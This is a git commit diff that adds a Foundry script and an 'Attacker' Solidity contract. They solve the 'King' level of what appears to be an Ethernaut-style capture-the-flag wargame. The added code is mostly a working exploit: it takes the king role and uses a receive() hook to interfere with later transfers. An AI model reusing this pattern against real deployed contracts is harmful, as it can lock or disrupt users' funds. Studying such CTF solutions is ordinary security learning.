59fb72a5cad8fb3fa0262ca76a2c9b7597701880
Tomas <tomasfreire@gmail.com>
2024-02-05 14:31:02 -0300

    new level: king

--- script/09_King.s.sol
+++ script/09_King.s.sol
@@ -5,6 +5,24 @@ pragma solidity ^0.8.19;
 import { Script, console } from "forge-std/Script.sol";
 import { King } from "../src/09_King.sol";
 
+contract Attacker {
+
+  address instance;
+  constructor (address challengeInstanceAddress) {
+    instance = challengeInstanceAddress;
+  }
+
+  function attackInstance() public payable {
+    (bool success, ) = address(instance).call{value: 1}("");
+    require(success, "Call failed");
+  }
+
+  function fundContract() external payable {}
+  receive() external payable {
+    address(instance).call{value: 0}("");
+  }
+}
+
 contract KingAttacker is Script {
 
   address payable challengeInstanceAddress = payable(0x913bE527a67E3a0945ec13A7c00f3480C48965d2);
@@ -13,7 +31,11 @@ contract KingAttacker is Script {
 
   function run() external {
     vm.startBroadcast(deployerPrivateKey);
-    
+    Attacker attacker = new Attacker(challengeInstanceAddress);
+    attacker.fundContract{value: 1}();
+    attacker.attackInstance();
+
+    console.log("Challenge owner: %s", challenge.owner());
 
     vm.stopBroadcast();
   }
